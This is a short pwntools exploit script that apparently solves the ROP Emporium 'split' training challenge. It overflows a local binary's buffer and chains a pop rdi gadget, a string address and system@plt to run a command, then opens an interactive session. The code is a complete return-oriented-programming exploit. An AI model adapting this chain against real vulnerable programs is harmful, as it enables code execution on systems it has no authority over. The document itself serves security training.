#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

io = process("./split")

print("connect gdb to pid %d" % io.pid)
pause()

payload = b'A'*32 + b'B'*8
cat_virtual_address = p64(0x1060 - 0x1050 + 0x601050)
pop_rdi = p64(0x000000004007c3)
system_plt = p64(0x000000000040074b)
payload += pop_rdi + cat_virtual_address + system_plt
io.sendline(payload)
io.interactive()